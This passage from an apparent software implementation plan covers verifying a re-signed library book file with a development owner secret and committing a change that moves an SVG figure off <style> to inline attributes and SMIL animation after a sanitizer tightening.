Expected: "signature valid, integrity fresh, mirror matches"; the mobile suite green. If the backend Python env is ever available, `SYSTEM_OWNER_SECRET=$(printf '1%.0s' {1..64}) python -m backend.src.core.owner_cli verify` is the canonical check — but the stdlib recompute above is byte-for-byte equivalent (same `_SIGNED_FIELDS` + HMAC), and the `Backend — Tests` CI gate re-verifies on push.

- [ ] **Step 5: Commit**
```bash
git add library/books/claude-certified-architect-foundations.book.json library/manifest.json mobile/assets/library/books/claude-certified-architect-foundations.book.json mobile/assets/library/manifest.json
git commit -m "content(library): convert the escalation-flow figure off <style> to inline attrs + SMIL

The topic sanitizer now drops <style> (unscreenable CSS fetch channel). This one
figure used <style> for text fill + an opacity pulse; both are re-expressed as
SVG-native inline presentation attributes and SMIL <animate> (matching the book's
62 other SMIL animations), so it renders identically without <style>. Book
re-signed with the dev owner secret; mobile mirror updated."
```
